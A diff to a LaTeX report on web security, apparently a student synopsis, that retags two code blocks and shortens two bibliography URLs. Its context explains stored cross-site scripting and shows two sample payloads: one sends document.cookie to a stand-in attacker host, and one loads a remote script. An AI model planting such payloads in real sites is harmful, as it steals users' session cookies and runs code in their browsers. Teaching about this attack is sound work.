@@ -439,7 +439,7 @@ example could be a comment on a forum, which contains Javascript code. If the
 vulnerability is present, it will not be displayed on the page, but it will be
 executed. It could be simple like:
 
-\begin{minted}{js}
+\begin{minted}{html}
 <script>document.createElement('img').src = 'http://attackerswebsite.com/' +
 document.cookie</script>
 \end{minted}
@@ -448,7 +448,7 @@ This script would create an HTTP request to attacker's website with the victim's
 cookies, which could contain for example very useful session token. It is also
 possible to include much bigger scripts with:
 
-\begin{minted}{js}
+\begin{minted}{html}
 <script src="http://attackerswebsite.com/evilscript.js"></script>
 \end{minted}
 
@@ -602,13 +602,13 @@ end, I managed to finish my synopsis on time, so it is not a big issue.
 	\bibitem{sbd}
 		OWASP.
 		\textit{Security by Design Principles}.
-		\texttt{https://www.owasp.org/index.php/\allowbreak{}
+		\texttt{https://owasp.org/index.php/\allowbreak{}
 		Security\_by\_Design\_Principles}
 
 	\bibitem{sdl}
 		Microsoft.
 		\textit{Security Development Lifecycle}.
-		\texttt{https://www.microsoft.com/sdl}
+		\texttt{https://microsoft.com/sdl}
 
 \end{thebibliography}
 
